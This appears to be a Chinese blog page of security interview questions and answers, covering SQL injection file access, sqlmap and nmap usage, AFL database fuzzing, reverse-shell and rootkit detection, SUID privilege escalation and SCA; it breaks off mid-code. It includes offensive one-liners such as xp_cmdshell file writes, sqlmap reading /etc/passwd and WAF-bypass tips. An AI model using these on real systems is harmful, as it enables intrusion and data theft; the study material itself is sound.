<h3 id="SQL注入读文件和写文件"><a href="#SQL注入读文件和写文件" class="headerlink" title="SQL注入读文件和写文件"></a>SQL注入读文件和写文件</h3><ul>
<li><strong>读文件</strong> ：可以使用<code>OPENROWSET</code>、<code>BULK INSERT</code>等函数来读取文件内容。例如，使用<code>OPENROWSET</code>读取文件：<code>SELECT * FROM OPENROWSET(&#39;SQLOLEDB&#39;,&#39;.;UID=sa;PWD=&#39;,&#39;select * from OPENROWSET(&#39;BULK &#39;&#39;C:\test.txt&#39;&#39;, SINGLE_BLOB) as t&#39;)</code>。</li>
<li><strong>写文件</strong> ：不能直接用函数来写文件，因为写文件不是一个函数，需要借助其他方法。例如，可以利用<code>xp_cmdshell</code>来执行命令，将数据写入文件。如<code>xp_cmdshell &#39;echo hello &gt; c:\test.txt&#39;</code>。</li>
</ul>
<h3 id="SQL注入的修复"><a href="#SQL注入的修复" class="headerlink" title="SQL注入的修复"></a>SQL注入的修复</h3><ul>
<li><strong>输入验证</strong> ：对用户输入进行严格的验证，确保输入符合预期的格式和类型。</li>
<li><strong>参数化查询</strong> ：使用参数化查询来避免SQL注入，将用户输入作为参数传递给数据库。</li>
<li><strong>最小化权限</strong> ：为数据库用户分配最小的权限，避免用户拥有不必要的权限。</li>
<li><strong>更新和补丁</strong> ：及时更新数据库系统和应用程序，应用安全补丁，修复已知的安全漏洞。</li>
</ul>
<h3 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h3><ul>
<li><strong>最近登录的用户</strong> ：可以使用<code>last</code>命令查看最近登录的用户信息。</li>
<li><strong>查看一个文件的后500行</strong> ：使用<code>tail -n 500</code>命令。</li>
<li><strong>查看一个文件的行数</strong> ：使用<code>wc -l</code>命令。</li>
<li><strong>查找文件的位置</strong> ：可以使用<code>find</code>命令或<code>locate</code>命令。<code>find</code>命令可以根据文件名、路径、类型等条件查找文件，如<code>find / -name filename</code>。<code>locate</code>命令则基于数据库查找文件，速度较快，但数据库需要定期更新，如<code>locate filename</code>。</li>
</ul>
<h3 id="Linux文件权限777"><a href="#Linux文件权限777" class="headerlink" title="Linux文件权限777"></a>Linux文件权限777</h3><p>777代表所有者、所属组和其他用户都拥有读（<code>r</code>）、写（<code>w</code>）和执行（<code>x</code>）权限。其中，第一个数字表示所有者权限，第二个数字表示所属组权限，第三个数字表示其他用户权限。每个数字对应不同的权限，<code>r</code>代表4，<code>w</code>代表2，<code>x</code>代表1。</p>
<h3 id="Windows命令"><a href="#Windows命令" class="headerlink" title="Windows命令"></a>Windows命令</h3><ul>
<li><strong>知道一个端口，找进程</strong> ：可以使用<code>netstat -ano | findstr 端口号</code>命令，找到与该端口相关的进程<code>ID</code>。</li>
<li><strong>杀进程的命令</strong> ：使用<code>taskkill /PID 进程ID /F</code>命令。</li>
<li><strong>启动和终止进程</strong> ：启动进程可以使用<code>start</code>命令，如<code>start notepad.exe</code>。终止进程可以使用<code>taskkill</code>命令，如<code>taskkill /IM 进程名 /F</code>。</li>
</ul>
<h3 id="HTTPS建立过程"><a href="#HTTPS建立过程" class="headerlink" title="HTTPS建立过程"></a>HTTPS建立过程</h3><ol>
<li><strong>握手阶段</strong>：客户端和服务器通过交换信息来协商加密算法、密钥等参数。</li>
<li><strong>证书验证</strong>：服务器向客户端发送数字证书，客户端验证证书的有效性。</li>
<li><strong>密钥交换</strong>：双方通过协商算法交换密钥，用于后续的加密通信。</li>
<li><strong>加密通信</strong>：使用协商好的密钥和算法进行数据加密传输。</li>
</ol>
<h3 id="Python内存管理"><a href="#Python内存管理" class="headerlink" title="Python内存管理"></a>Python内存管理</h3><ol>
<li><strong>引用计数</strong>：Python通过引用计数来跟踪对象的引用情况，当引用计数为零时，对象会被销毁并释放内存。</li>
<li><strong>垃圾回收</strong>：Python使用分代垃圾回收机制来处理循环引用等问题。</li>
<li><strong>内存池管理</strong>：Python有内存池机制，用于管理小于256字节的对象，提高内存分配效率。</li>
</ol>
<h3 id="溯源攻击示例"><a href="#溯源攻击示例" class="headerlink" title="溯源攻击示例"></a>溯源攻击示例</h3><ol>
<li><strong>日志分析</strong>：通过分析服务器日志，寻找异常的访问模式和来源IP。</li>
<li><strong>数据包捕获</strong>：使用工具如Wireshark捕获网络数据包，分析攻击来源。</li>
<li><strong>示例</strong>：假设某网站遭受了SQL注入攻击，通过查看Web服务器日志，发现来自特定IP的异常SQL请求，进一步分析该IP的相关信息，确定攻击来源。</li>
</ol>
<h3 id="DNS协议的作用与解析过程"><a href="#DNS协议的作用与解析过程" class="headerlink" title="DNS协议的作用与解析过程"></a>DNS协议的作用与解析过程</h3><ol>
<li><strong>作用</strong>：将域名转换为IP地址，便于用户记忆和访问网站。</li>
<li><strong>解析过程</strong>：从本地DNS缓存开始，逐级查询根DNS服务器、顶级域名服务器、权威DNS服务器，直到获取目标域名的IP地址。</li>
</ol>
<h3 id="DNS协议的安全问题"><a href="#DNS协议的安全问题" class="headerlink" title="DNS协议的安全问题"></a>DNS协议的安全问题</h3><ol>
<li><strong>缓存中毒</strong>：攻击者向DNS服务器注入虚假的DNS记录，导致用户被引导到错误的网站。</li>
<li><strong>DNS劫持</strong>：攻击者篡改DNS查询结果，将用户引导到恶意网站。</li>
<li><strong>拒绝服务攻击</strong>：通过大量DNS查询导致DNS服务器过载，无法正常响应合法请求。</li>
</ol>
<h3 id="带外COKIES遇到WAF的应对"><a href="#带外COKIES遇到WAF的应对" class="headerlink" title="带外COKIES遇到WAF的应对"></a>带外COKIES遇到WAF的应对</h3><ol>
<li><strong>编码混淆</strong>：对Cookie值进行URL编码或Base64编码，绕过WAF检测。</li>
<li><strong>拆分Cookie</strong>：将Cookie拆分为多个部分，分别发送，最后在服务器端组合。</li>
</ol>
<h3 id="AWVS登录扫描操作"><a href="#AWVS登录扫描操作" class="headerlink" title="AWVS登录扫描操作"></a>AWVS登录扫描操作</h3><ol>
<li><strong>启动AWVS</strong>：打开AWVS控制台，登录系统。</li>
<li><strong>添加目标</strong>：输入要扫描的目标URL。</li>
<li><strong>配置扫描参数</strong>：设置扫描范围、深度、扫描类型等参数。</li>
<li><strong>开始扫描</strong>：启动扫描任务，AWVS会自动对目标进行漏洞检测。</li>
</ol>
<h3 id="SQLMAP使用"><a href="#SQLMAP使用" class="headerlink" title="SQLMAP使用"></a>SQLMAP使用</h3><ol>
<li><strong>基本命令</strong>：<code>sqlmap -u &quot;http://example.com/page?id=1&quot;</code>，对指定URL进行SQL注入检测。</li>
<li><strong>级别与区别</strong>：<ul>
<li><strong>Level 1</strong>：快速检测，适合初步扫描。</li>
<li><strong>Level 2</strong>：中等深度，适合更详细的检测。</li>
<li><strong>Level 3</strong>：深度检测，适合全面的漏洞挖掘。</li>
</ul>
</li>
<li><strong>扫数据包</strong>：<code>sqlmap -r request.txt</code>，使用保存的HTTP请求文件进行扫描。</li>
<li><strong>本地读文件</strong>：<code>sqlmap -u &quot;http://example.com/page?id=1&quot; --file-read=&quot;/etc/passwd&quot;</code>，读取服务器上的文件。</li>
<li><strong>指定参数</strong>：<code>sqlmap -u &quot;http://example.com/page?id=1&quot; -p id</code>，指定要测试的参数。</li>
</ol>
<h3 id="NMAP扫描命令"><a href="#NMAP扫描命令" class="headerlink" title="NMAP扫描命令"></a>NMAP扫描命令</h3><ol>
<li><strong>静Ping扫描</strong>：<code>nmap -sP 192.168.1.0/24</code>，检测网络中的活跃主机。</li>
<li><strong>查看端口开放</strong>：<code>nmap -p 80,443 192.168.1.1</code>，检测指定端口是否开放。</li>
<li><strong>查看系统版本信息</strong>：<code>nmap -sV 192.168.1.1</code>，获取目标系统的版本信息。</li>
</ol>
<h2 id="蚂蚁"><a href="#蚂蚁" class="headerlink" title="蚂蚁"></a>蚂蚁</h2><h3 id="如何给AFL做适配去fuzz数据库"><a href="#如何给AFL做适配去fuzz数据库" class="headerlink" title="如何给AFL做适配去fuzz数据库"></a>如何给AFL做适配去fuzz数据库</h3><h4 id="1-AFL适配数据库fuzz"><a href="#1-AFL适配数据库fuzz" class="headerlink" title="1. AFL适配数据库fuzz"></a>1. <strong>AFL适配数据库fuzz</strong></h4><p>要使用AFL对数据库进行fuzz测试，首先需要确保数据库的输入可以被AFL识别和处理。以下是适配步骤：</p>
<ul>
<li><strong>确定输入格式</strong>：明确数据库接受的输入格式，如SQL语句、配置文件等。</li>
<li><strong>编写测试用例生成器</strong>：生成符合数据库输入格式的测试用例。</li>
<li><strong>设置AFL环境</strong>：配置AFL以识别数据库的输入和输出。</li>
<li><strong>运行AFL</strong>：使用AFL对数据库进行fuzz测试。</li>
</ul>
<h4 id="2-fuzz流程"><a href="#2-fuzz流程" class="headerlink" title="2. fuzz流程"></a>2. <strong>fuzz流程</strong></h4><ul>
<li><strong>选取目标</strong>：确定要测试的数据库组件，如SQL解析器、存储引擎等。</li>
<li><strong>生成初始测试用例</strong>：创建一组基础的测试用例，覆盖常见的输入场景。</li>
<li><strong>设置AFL环境</strong>：配置AFL的输入目录和输出目录。</li>
<li><strong>运行AFL</strong>：启动AFL，开始fuzz测试。</li>
<li><strong>监控和分析结果</strong>：监控AFL的运行状态，分析发现的崩溃和异常。</li>
</ul>
<h4 id="3-AFL的插桩原理"><a href="#3-AFL的插桩原理" class="headerlink" title="3. AFL的插桩原理"></a>3. <strong>AFL的插桩原理</strong></h4><p>AFL通过编译时插桩来收集程序执行的覆盖率信息。插桩代码会插入到程序的每个基本块中，记录执行路径。AFL利用这些信息来指导变异过程，优先选择能够发现新执行路径的测试用例。</p>
<h4 id="4-选择fuzz测试点"><a href="#4-选择fuzz测试点" class="headerlink" title="4. 选择fuzz测试点"></a>4. <strong>选择fuzz测试点</strong></h4><ul>
<li><strong>输入解析</strong>：数据库的输入解析模块是关键测试点，如SQL解析器。</li>
<li><strong>查询执行</strong>：查询执行引擎也是重要的测试点，可能包含复杂的逻辑。</li>
<li><strong>存储操作</strong>：涉及数据存储和检索的模块，如存储引擎。</li>
</ul>
<h4 id="5-数据库fuzz和普通程序fuzz的不同"><a href="#5-数据库fuzz和普通程序fuzz的不同" class="headerlink" title="5. 数据库fuzz和普通程序fuzz的不同"></a>5. <strong>数据库fuzz和普通程序fuzz的不同</strong></h4><ul>
<li><strong>复杂性</strong>：数据库通常具有复杂的输入格式和状态管理，增加了fuzz的难度。</li>
<li><strong>输入多样性</strong>：数据库接受多种类型的输入，如SQL语句、配置文件等。</li>
<li><strong>环境依赖</strong>：数据库通常运行在特定的环境中，可能依赖于特定的配置和数据集。</li>
</ul>
<h3 id="示例代码：AFL适配数据库fuzz"><a href="#示例代码：AFL适配数据库fuzz" class="headerlink" title="示例代码：AFL适配数据库fuzz"></a>示例代码：AFL适配数据库fuzz</h3><h4 id="1-编写测试用例生成器"><a href="#1-编写测试用例生成器" class="headerlink" title="1. 编写测试用例生成器"></a>1. <strong>编写测试用例生成器</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_test_case</span>():</span><br><span class="line">    <span class="comment"># 生成随机的SQL语句</span></span><br><span class="line">    sql_statements = [</span><br><span class="line">        <span class="string">&quot;SELECT * FROM users WHERE id = &#123;&#125;;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;INSERT INTO users (name, age) VALUES (&#x27;&#123;&#125;&#x27;, &#123;&#125;);&quot;</span>,</span><br><span class="line">        <span class="string">&quot;UPDATE users SET name = &#x27;&#123;&#125;&#x27; WHERE id = &#123;&#125;;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;DELETE FROM users WHERE id = &#123;&#125;;&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    test_case = random.choice(sql_statements)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="keyword">in</span> test_case:</span><br><span class="line">        test_case = test_case.<span class="built_in">format</span>(</span><br><span class="line">            <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">10</span>)),</span><br><span class="line">            random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> test_case</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成初始测试用例</span></span><br><span class="line">os.makedirs(<span class="string">&#x27;afl_in&#x27;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;afl_in/test_<span class="subst">&#123;i&#125;</span>.sql&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(generate_test_case())</span><br></pre></td></tr></table></figure>

<h4 id="2-设置AFL环境"><a href="#2-设置AFL环境" class="headerlink" title="2. 设置AFL环境"></a>2. <strong>设置AFL环境</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装AFL</span></span><br><span class="line">wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz</span><br><span class="line">tar -xvf afl-latest.tgz</span><br><span class="line"><span class="built_in">cd</span> afl-2.52b/</span><br><span class="line">make</span><br><span class="line"><span class="built_in">sudo</span> make install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译数据库代码（假设使用MySQL）</span></span><br><span class="line"><span class="built_in">cd</span> mysql/</span><br><span class="line">CC=/path/to/afl-gcc CXX=/path/to/afl-g++ cmake .</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行AFL</span></span><br><span class="line"><span class="built_in">mkdir</span> afl_out</span><br><span class="line">afl-fuzz -i afl_in -o afl_out ./path/to/database_executable @@</span><br></pre></td></tr></table></figure>

<h4 id="3-监控和分析结果"><a href="#3-监控和分析结果" class="headerlink" title="3. 监控和分析结果"></a>3. <strong>监控和分析结果</strong></h4><p>AFL会在<code>afl_out</code>目录下生成测试结果，包括发现的崩溃和异常。可以使用AFL提供的工具如<code>afl-analyze</code>来进一步分析结果。</p>
<h2 id="安全开发工程师"><a href="#安全开发工程师" class="headerlink" title="安全开发工程师"></a>安全开发工程师</h2><h3 id="如何查看自己服务器某个端口情况"><a href="#如何查看自己服务器某个端口情况" class="headerlink" title="如何查看自己服务器某个端口情况"></a>如何查看自己服务器某个端口情况</h3><ol>
<li><p>**使用 <code>netstat</code>**：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> netstat -tuln | grep :&lt;port&gt;</span><br></pre></td></tr></table></figure>
<p>示例：查看 8080 端口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> netstat -tuln | grep :8080</span><br></pre></td></tr></table></figure>
</li>
<li><p>**使用 <code>lsof</code>**：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> lsof -i :&lt;port&gt;</span><br></pre></td></tr></table></figure>
<p>示例：查看 8080 端口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> lsof -i :8080</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="如何查看远程服务器情况"><a href="#如何查看远程服务器情况" class="headerlink" title="如何查看远程服务器情况"></a>如何查看远程服务器情况</h3><ol>
<li><p>**使用 <code>telnet</code>**：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet &lt;remote_host&gt; &lt;port&gt;</span><br></pre></td></tr></table></figure>
<p>示例：检查远程服务器的 80 端口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.1.1 80</span><br></pre></td></tr></table></figure>
</li>
<li><p>**使用 <code>nc</code>**：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -zv &lt;remote_host&gt; &lt;port&gt;</span><br></pre></td></tr></table></figure>
<p>示例：检查远程服务器的 443 端口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -zv 192.168.1.1 443</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>通过三次握手查看</strong>：<br>使用 <code>nmap</code> 扫描远程主机的端口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS &lt;remote_host&gt;</span><br></pre></td></tr></table></figure>
<p>示例：扫描远程主机的所有开放端口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS 192.168.1.1</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="反弹-shell-如何检测"><a href="#反弹-shell-如何检测" class="headerlink" title="反弹 shell 如何检测"></a>反弹 shell 如何检测</h3><ol>
<li><p><strong>通过 <code>netstat</code> 查看可疑连接</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> netstat -tuln</span><br></pre></td></tr></table></figure>
<p>检查是否有异常的外连。</p>
</li>
<li><p><strong>通过 <code>lsof</code> 查看可疑进程</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> lsof -i</span><br></pre></td></tr></table></figure>
<p>检查是否有异常的网络连接。</p>
</li>
<li><p><strong>通过日志分析</strong>：<br>检查系统日志（如 <code>/var/log/auth.log</code>）中的异常登录记录。</p>
</li>
</ol>
<h3 id="如果攻击者使用了-AWK，如何检测"><a href="#如果攻击者使用了-AWK，如何检测" class="headerlink" title="如果攻击者使用了 AWK，如何检测"></a>如果攻击者使用了 AWK，如何检测</h3><ol>
<li><p><strong>检查 AWK 进程</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep awk</span><br></pre></td></tr></table></figure>
<p>查看是否有异常的 AWK 进程。</p>
</li>
<li><p><strong>检查 AWK 脚本</strong>：<br>检查 <code>/tmp</code> 或其他临时目录中是否有可疑的 AWK 脚本。</p>
</li>
</ol>
<h3 id="除了进程树的命令匹配，还有可以检测反弹-shell-的方法吗？"><a href="#除了进程树的命令匹配，还有可以检测反弹-shell-的方法吗？" class="headerlink" title="除了进程树的命令匹配，还有可以检测反弹 shell 的方法吗？"></a>除了进程树的命令匹配，还有可以检测反弹 shell 的方法吗？</h3><ol>
<li><p><strong>检查网络连接</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> netstat -tuln</span><br></pre></td></tr></table></figure>
<p>查看是否有异常的外连。</p>
</li>
<li><p><strong>检查系统日志</strong>：<br>检查 <code>/var/log/auth.log</code> 或其他相关日志文件中的异常登录记录。</p>
</li>
<li><p><strong>使用 IDS&#x2F;IPS</strong>：<br>部署入侵检测系统（如 Snort）来检测异常的网络流量。</p>
</li>
</ol>
<h3 id="你了解哪些提权手段？"><a href="#你了解哪些提权手段？" class="headerlink" title="你了解哪些提权手段？"></a>你了解哪些提权手段？</h3><ol>
<li><p><strong>SUID 提权</strong>：</p>
<ul>
<li><strong>原理</strong>：SUID（Set User ID）允许普通用户以文件所有者的权限执行程序。</li>
<li><strong>示例</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>内核漏洞提权</strong>：</p>
<ul>
<li>利用内核漏洞（如 Dirty COW）获取 root 权限。</li>
</ul>
</li>
<li><p><strong>服务漏洞提权</strong>：</p>
<ul>
<li>利用服务漏洞（如 Sudo 提权漏洞）获取更高权限。</li>
</ul>
</li>
</ol>
<h3 id="什么是-SUID-提权"><a href="#什么是-SUID-提权" class="headerlink" title="什么是 SUID 提权"></a>什么是 SUID 提权</h3><ul>
<li><strong>原理</strong>：SUID 位设置的文件允许任何用户以文件所有者的权限执行该文件。</li>
<li><strong>示例</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+s /usr/bin/program</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="进程隐藏技术是什么，如何检测？"><a href="#进程隐藏技术是什么，如何检测？" class="headerlink" title="进程隐藏技术是什么，如何检测？"></a>进程隐藏技术是什么，如何检测？</h3><ol>
<li><p><strong>进程隐藏技术</strong>：</p>
<ul>
<li>通过修改内核或使用 rootkit 隐藏进程。</li>
</ul>
</li>
<li><p><strong>检测方法</strong>：</p>
<ul>
<li>使用 <code>chkrootkit</code> 或 <code>rkhunter</code> 检测 rootkit。</li>
<li>比较 <code>ps</code> 和 <code>top</code> 的输出，检查是否有不一致的进程。</li>
</ul>
</li>
</ol>
<h3 id="聊聊-IAST"><a href="#聊聊-IAST" class="headerlink" title="聊聊 IAST"></a>聊聊 IAST</h3><ul>
<li><strong>IAST（Interactive Application Security Testing）</strong>：<ul>
<li>通过动态分析和静态分析相结合的方式，检测应用程序的安全漏洞。</li>
<li><strong>工具</strong>：Acunetix、Contrast Security。</li>
</ul>
</li>
</ul>
<h3 id="如果多进程下，A-进程的-Source-触发到了-B-进程的-Sink-点，如何溯源？"><a href="#如果多进程下，A-进程的-Source-触发到了-B-进程的-Sink-点，如何溯源？" class="headerlink" title="如果多进程下，A 进程的 Source 触发到了 B 进程的 Sink 点，如何溯源？"></a>如果多进程下，A 进程的 Source 触发到了 B 进程的 Sink 点，如何溯源？</h3><ol>
<li><p><strong>日志分析</strong>：</p>
<ul>
<li>检查 A 进程和 B 进程的日志，寻找相关的调用链。</li>
</ul>
</li>
<li><p><strong>代码审查</strong>：</p>
<ul>
<li>审查代码，找到 A 进程的 Source 和 B 进程的 Sink 点之间的调用关系。</li>
</ul>
</li>
<li><p><strong>使用调试工具</strong>：</p>
<ul>
<li>使用调试工具（如 GDB）跟踪进程间的通信。</li>
</ul>
</li>
</ol>
<h3 id="SCA是什么以及如何实现"><a href="#SCA是什么以及如何实现" class="headerlink" title="SCA是什么以及如何实现"></a>SCA是什么以及如何实现</h3><p><strong>SCA（Software Composition Analysis）</strong> 是一种用于识别和分析应用程序中使用的开源组件的技术。它可以帮助组织了解其软件供应链中的安全漏洞、许可证合规性问题以及代码质量。SCA工具通常通过扫描代码库、容器和相关部分来自动识别所有开源组件、许可证信息以及安全漏洞。</p>
<h4 id="SCA的实现方式"><a href="#SCA的实现方式" class="headerlink" title="SCA的实现方式"></a><strong>SCA的实现方式</strong></h4><ol>
<li><p><strong>灰盒测试实现</strong>：</p>
<ul>
<li><strong>依赖分析</strong>：通过分析应用程序的依赖关系图来识别所有直接和间接依赖的开源组件。</li>
<li><strong>运行时监控</strong>：利用agent技术，在应用程序运行时监控其行为，识别使用的组件和潜在的安全风险。</li>
<li><strong>示例代码</strong>：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用agent监控应用程序的依赖</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DependencyMonitor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 模拟agent监控逻辑</span></span><br><span class="line">        List&lt;String&gt; dependencies = scanDependencies();</span><br><span class="line">        <span class="keyword">for</span> (String dep : dependencies) &#123;</span><br><span class="line">            checkVulnerabilities(dep);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title function_">scanDependencies</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 模拟扫描依赖</span></span><br><span class="line">        <span class="keyword">return</span> Arrays.asList(<span class="string">&quot;spring-core:5.3.10&quot;</span>, <span class="string">&quot;log4j:2.17.1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkVulnerabilities</span><span class="params">(String dependency)</span> &#123;</span><br><span class="line">        <span class="comment">// 模拟检查漏洞</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Checking vulnerabilities for: &quot;</span> + dependency);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>白盒测试实现</strong>：</p>
<ul>
<li><strong>静态分析</strong>：通过分析源代码或构建配置文件（如<code>pom.xml</code>、<code>build.gradle</code>）来识别依赖关系。</li>
<li><strong>结合Maven插件</strong>：使用Maven插件可以更高效地分析项目的依赖关系，并生成详细的报告。</li>
<li><strong>示例代码</strong>：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Maven插件示例 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.owasp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dependency-check-maven<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">goal</span>&gt;</span>check<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="如何探测是否存在某个类（jar包）"><a href="#如何探测是否存在某个类（jar包）" class="headerlink" title="如何探测是否存在某个类（jar包）"></a>如何探测是否存在某个类（jar包）</h3><ol>
<li><p><strong>扫描类路径</strong>：通过扫描类路径来检测是否存在特定的类或jar包。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassDetector</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">detectClass</span><span class="params">(String className)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(className);</span><br><span class="line">            <span 